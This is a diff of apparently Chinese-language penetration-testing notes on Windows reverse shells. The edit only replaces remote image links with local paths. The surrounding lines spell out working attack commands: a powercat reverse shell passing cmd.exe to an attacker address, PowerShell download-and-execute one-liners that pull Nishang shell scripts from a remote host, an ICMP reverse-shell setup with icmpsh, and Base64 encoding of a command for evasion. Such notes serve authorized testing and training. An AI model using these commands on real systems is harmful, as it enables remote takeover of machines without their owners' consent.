@@ -31,7 +31,7 @@
 	反向连接：
 	攻击机：nc -l -p 8080 -vv
 	靶机:powercat -c 192.168.0.1 -p 8080 -v -e cmd.exe
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/207.png)
+![image](img/207.png)
   #### Nishang
   ##### Bind shell
 	靶机：
@@ -51,22 +51,22 @@
   ##### HTTPS
 	攻击机：
 	>powershell -nop -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/nishang/Shells/Invoke-PoshRatHttps.ps1'); Invoke-PoshRatHttps -IPAddress 192.168.0.98 -Port 8080 -SSLPort 443"  IP地址是本机IP
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/208.png)
+![image](img/208.png)
 
 	靶机：
 	>powershell -w hidden -nop -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.98:8080/connect')
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/209.png)
+![image](img/209.png)
   ##### ICMP
 	攻击机IP:108
 	靶机IP:100
 	https://github.com/inquisb/icmpsh
 	靶机执行
 	>powershell -nop -ep bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.108/ps/nishang/Shells/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp 192.168.0.108
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/210.png)
+![image](img/210.png)
 
 	攻击机执行，开启相应ICMP ECHO请求
 	>sysctl -w net.ipv4.icmp_echo_ignore_all=1
 	>./icmpsh_m.py 192.168.0.108 192.168.0.100
-![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/211.png)
+![image](img/211.png)
   #### Base64
 	>Powershell "$string="net user";[convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($string))"
